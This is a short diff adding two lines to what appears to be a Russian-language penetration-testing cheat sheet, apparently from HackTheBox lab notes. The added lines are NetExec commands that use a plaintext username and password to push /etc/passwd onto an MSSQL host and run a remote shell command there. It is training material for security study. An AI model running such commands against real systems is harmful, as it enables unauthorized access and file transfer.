@@ -246,8 +246,12 @@ export KRB5CCNAME=sqlsvc.ccache
 
         describe wp_users; (описать таблицу)
 
-                 
-                                                                    
+        # Загрузка и выгрузка файлов из MSSQL
+
+            nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
+            
+            nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"
+                                                     
                                                                             
 
 
